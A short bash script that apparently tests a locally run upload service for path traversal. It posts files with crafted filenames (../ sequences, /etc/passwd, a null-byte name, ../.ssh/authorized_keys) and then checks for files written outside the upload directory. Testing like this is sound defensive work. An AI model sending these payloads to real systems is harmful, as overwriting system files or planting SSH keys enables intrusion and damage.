#!/bin/bash
# Save as test_path_traversal.sh

echo "🔓 Testing Path Traversal Vulnerability..."

# Create test file
echo "MALICIOUS CONTENT" > test.txt

echo "Test 1: Basic path traversal (../)"
curl -X POST http://127.0.0.1:8080/upload \
  -F "file=@test.txt;filename=../../../malicious1.txt" \
  -v

echo -e "\n\nTest 2: Multiple directory traversal"
curl -X POST http://127.0.0.1:8080/upload \
  -F "file=@test.txt;filename=../../../../../../../../tmp/exploit.txt" \
  -v

echo -e "\n\nTest 3: Absolute path"
curl -X POST http://127.0.0.1:8080/upload \
  -F "file=@test.txt;filename=/etc/passwd" \
  -v

echo -e "\n\nTest 4: Null byte injection"
curl -X POST http://127.0.0.1:8080/upload \
  -F "file=@test.txt;filename=../../../tmp/hack%00.txt" \
  -v

echo -e "\n\nTest 5: Hidden file"
curl -X POST http://127.0.0.1:8080/upload \
  -F "file=@test.txt;filename=../.ssh/authorized_keys" \
  -v

# Check if files were created outside upload directory
echo -e "\n\n🔍 Checking for malicious files..."
ls -la /tmp/malicious* 2>/dev/null && echo "❌ VULNERABILITY CONFIRMED: Files created outside upload dir!"
ls -la /tmp/exploit* 2>/dev/null && echo "❌ VULNERABILITY CONFIRMED: Files created outside upload dir!"
ls -la ../malicious* 2>/dev/null && echo "❌ VULNERABILITY CONFIRMED: Files created outside upload dir!"

# Cleanup
rm -f test.txt